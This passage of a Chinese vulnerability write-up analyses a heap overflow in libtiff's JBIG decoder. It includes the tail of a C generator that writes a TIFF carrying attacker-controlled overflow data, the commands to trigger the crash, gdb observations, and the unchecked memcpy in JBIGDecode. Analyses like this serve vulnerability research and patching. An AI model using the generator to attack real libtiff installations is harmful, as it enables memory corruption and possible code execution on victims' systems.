        0x1A, 0x01, // X_RESOLUTION
        0x05, 0x00, // RATIONAL
        0x01, 0x00, 0x00, 0x00, // 1 element
        0x1C, 0x00, 0x00, 0x00,
        0x1B, 0x01, // Y_RESOLUTION
        0x05, 0x00, // RATIONAL
        0x01, 0x00, 0x00, 0x00, // 1 Element
        0x24, 0x00, 0x00, 0x00,
        0x28, 0x01, // RESOLUTION_UNIT
        0x03, 0x00, // SHORT
        0x01, 0x00, 0x00, 0x00, // 1 Element
        0x02, 0x00, 0x00, 0x00, // 2
        0x0A, 0x01, // FILL_ORDER
        0x03, 0x00, // SHORT
        0x01, 0x00, 0x00, 0x00, // 1 Element
        0x02, 0x00, 0x00, 0x00, // Bit order inverted.
        0x00, 0x00, 0x00, 0x00 };
      // Adjust the offset for the IFDs.
      uint32_t ifd_offset = ftell(outputfile);
      fwrite(&(ifds[0]), sizeof(ifds), 1, outputfile);
      fseek(outputfile, 4, SEEK_SET);
      fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);
      // Adjust the strip size properly.
      fseek(outputfile, ifd_offset + 118, SEEK_SET);
      fwrite(&ifd_offset, sizeof(ifd_offset), 1, outputfile);
      fclose(outputfile);
      fclose(inputfile);
      return 0;
    }
它主要的作用是生成一个可发生堆溢出的tiff文件，且溢出内容可以由我们控制，如创建一个文本文件text，其内容大量填充为aaaa...
执行`./testcase_generator text testcase.tif`
这就会使得大量aaa数据通过JBIG压缩方式被写入testcase.tif文件中
接着执行poc：
`./poc ./testcase.tif`
成功触发漏洞：
这里报错是，free的时候发现该chunk的next
size位异常，这种情况实际上是因为堆溢出太多数据，导致后续free的时候很多chunk被溢出篡改了数据，所以产生了这种报错
# 漏洞分析
## gdb调试
根据cve信息，我这里直接定位到 JBIGDecode函数，给他整个断点
然后一步步nextcall
直到执行`_TIFFmemcpy`前
可以看到这个第三个参数就尼玛离谱，完全没有任何检查，该长度就是之前的text文本文件中的字符数量，也就是字符a的个数
然后来康康这个堆空间0x657b60的大小，只有0xb30
而`_TIFFmemcpy`的length是0x26d0，巨大的堆溢出就是这么产生的
## 源码分析
从poc.c结合libtiff来康康完整的函数调用链：
首先是`TIFFReadEncodedStrip(tif, strip, buf, (tsize_t) -1);`
在源码中，TIFFReadEncodedStrip会调用JBIGDecode函数
    TIFFReadEncodedStrip(TIFF* tif, uint32 strip, void* buf, tmsize_t size)
    {
        static const char module[] = "TIFFReadEncodedStrip";
        TIFFDirectory *td = &tif->tif_dir;
        tmsize_t stripsize;
        uint16 plane;
        stripsize=TIFFReadEncodedStripGetStripSize(tif, strip, &plane);
        if (stripsize==((tmsize_t)(-1)))
            return((tmsize_t)(-1));
        /* shortcut to avoid an extra memcpy() */
        if( td->td_compression == COMPRESSION_NONE &&
            size!=(tmsize_t)(-1) && size >= stripsize &&
            !isMapped(tif) &&
            ((tif->tif_flags&TIFF_NOREADRAW)==0) )
        {
            if (TIFFReadRawStrip1(tif, strip, buf, stripsize, module) != stripsize)
                return ((tmsize_t)(-1));
            if (!isFillOrder(tif, td->td_fillorder) &&
                (tif->tif_flags & TIFF_NOBITREV) == 0)
                TIFFReverseBits(buf,stripsize);
            (*tif->tif_postdecode)(tif,buf,stripsize);
            return (stripsize);
        }
        if ((size!=(tmsize_t)(-1))&&(sizetif_decodestrip)(tif,buf,stripsize,plane)tif_postdecode)(tif,buf,stripsize);
        return(stripsize);
    }
这里没有明显出现JBIGDecode函数名，但其实是用了函数指针的方法调用的
在TIFFInitJBIG函数中声明了该函数指针：
    int TIFFInitJBIG(TIFF* tif, int scheme)
    {
        assert(scheme == COMPRESSION_JBIG);
        /*
         * These flags are set so the JBIG Codec can control when to reverse
         * bits and when not to and to allow the jbig decoder and bit reverser
         * to write to memory when necessary.
         */
        tif->tif_flags |= TIFF_NOBITREV;
        tif->tif_flags &= ~TIFF_MAPPED;
        /* Setup the function pointers for encode, decode, and cleanup. */
        tif->tif_setupdecode = JBIGSetupDecode;
        tif->tif_decodestrip = JBIGDecode;//tif_setupencode = JBIGSetupEncode;
        tif->tif_encodestrip = JBIGEncode;
        return 1;
    }
最后来看JBIGDecode函数
    static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
    {
        struct jbg_dec_state decoder;
        int decodeStatus = 0;
        unsigned char* pImage = NULL;
        (void) size, (void) s;
        if (isFillOrder(tif, tif->tif_dir.td_fillorder))
        {
            TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize);
        }
        jbg_dec_init(&decoder);
    #if defined(HAVE_JBG_NEWLEN)
        jbg_newlen(tif->tif_rawdata, (size_t)tif->tif_rawdatasize);
    #endif /* HAVE_JBG_NEWLEN */
        decodeStatus = jbg_dec_in(&decoder, (unsigned char*)tif->tif_rawdata,
                      (size_t)tif->tif_rawdatasize, NULL);
        if (JBG_EOK != decodeStatus)
        {
            TIFFErrorExt(tif->tif_clientdata,
                     "JBIG", "Error (%d) decoding: %s",
                     decodeStatus,
    #if defined(JBG_EN)
                     jbg_strerror(decodeStatus, JBG_EN)
    #else
                     jbg_strerror(decodeStatus)
    #endif
                     );
            jbg_dec_free(&decoder);
            return 0;
        }
        pImage = jbg_dec_getimage(&decoder, 0);
        _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));
        jbg_dec_free(&decoder);
        return 1;
    }
    _TIFFmemcpy(void* d, const void* s, tmsize_t c)
    {
        memcpy(d, s, (size_t) c);
    }
可以看到，这里对`jbg_dec_getsize(&decoder)`的返回值是完全没有检查的，而该函数是直接封装到libjbig中的，它会直接从tiff文件中读取长度，因此过长的长度也不会被检查出来，由此引发堆溢出的漏洞